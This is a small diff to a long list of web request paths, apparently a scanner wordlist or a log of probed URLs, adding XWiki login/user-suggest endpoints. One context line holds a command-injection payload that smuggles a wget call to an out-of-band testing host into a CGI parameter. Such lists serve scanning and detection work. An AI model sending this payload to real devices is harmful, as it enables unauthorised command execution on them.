@@ -9693,3 +9693,6 @@ a
 /cgi-bin/nightled.cgi
 /cgi-bin/touchlist_sync.cgi?IP=;wget+http://ctu1e2la6l84rsl142k08zae6wsej3r48.oast.live;
 /?gad_source=5&gclid=EAIaIQobChMIyM7p17TligMVdqhmAh2oKiEtEAAYASAAEgJzJfD_BwE
+/bin/login/XWikiLogin?xpage=uorgsuggest&uorg=user&wiki&media=json
+/alerts/alertLightbox.php
+/xwiki/bin/login/XWikiLogin?xpage=uorgsuggest&uorg=user&wiki&media=json
